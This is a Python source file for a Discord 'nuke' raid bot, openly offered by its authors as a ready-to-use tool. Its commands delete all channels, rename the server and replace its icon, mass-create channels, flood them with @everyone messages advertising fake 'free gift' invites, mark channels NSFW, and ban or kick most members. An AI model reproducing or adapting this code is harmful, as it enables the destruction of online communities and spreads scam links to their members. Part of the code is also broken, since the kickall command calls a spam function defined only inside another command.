# BY XYTE X KHS
# by pansi and alexy
# si vas a skidear da creditos
import discord
from discord.ext import commands
import aiohttp
import asyncio
from datetime import datetime, timezone, timedelta
import re


intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    async def xyte_delete_channels():
        tasks = []
        for channel in guild.channels:
            if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
                tasks.append(channel.delete())
        await asyncio.gather(*tasks, return_exceptions=True)

    async def xyte_disable_community():
        try:
            await guild.edit(community=False)
        except:
            pass

    async def xyte_change_server_name_and_icon():
        url = "https://i.postimg.cc/kMWxRdhw/Screenshot-20250821-145739.jpg"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        icon = await resp.read()
                        await guild.edit(name="<==GHS CR4SH SRVERS==>", icon=icon)
        except:
            pass

    async def xyte_create_channels():
        tasks = []
        for _ in range(100):
            tasks.append(guild.create_text_channel("ghs"))
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.7)


    async def xyte_spam_channels():
        await asyncio.sleep(4)
        async def spam(xyg):
            for _ in range(15):
                try:
                    await xyg.send("@everyone беплатный гифт / free gift тут -> discord.gg/c2qsgAb7h4 https://www.youtube.com/@GHSV5")
                except:
                    pass
        await asyncio.gather(*(spam(xyg) for xyg in guild.text_channels), return_exceptions=True)
        await asyncio.sleep(0.7)

    await xyte_delete_channels()
    await xyte_disable_community()
    await xyte_change_server_name_and_icon()
    await xyte_create_channels()
    await xyte_spam_channels()

@bot.command()
async def nsfw_all(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    tasks = []
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                tasks.append(channel.edit(nsfw=True))
            except:
                pass
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def createchannels(ctx, amount: int = 50):
    await ctx.message.delete()
    guild = ctx.guild
    
    if amount > 100:
        amount = 100
    
    tasks = []
    for i in range(amount):
        tasks.append(guild.create_text_channel(f"xyte-khs"))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def banall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    tasks = []
    for member in guild.members:
        if member != ctx.author and member != bot.user and not member.guild_permissions.administrator:
            try:
                tasks.append(member.ban(reason="long live khs and xyte"))
            except:
                pass
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    async def spam_channel(channel):
        for _ in range(10):
            try:
                await channel.send("@everyone discord.gg/8xi | discord.gg/f5xG3Qwr | khs + xyte = fire")
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def kickall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    tasks = []

    for member in guild.members:
        if member != ctx.author and member != guild.owner:
            tasks.append(member.kick())

    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, Exception):
            pass
    
    await asyncio.gather(*(spam_channel(channel) for channel in guild.text_channels), return_exceptions=True)

bot.run("ez") # Put your bot token here

# BY XYTE X KHS

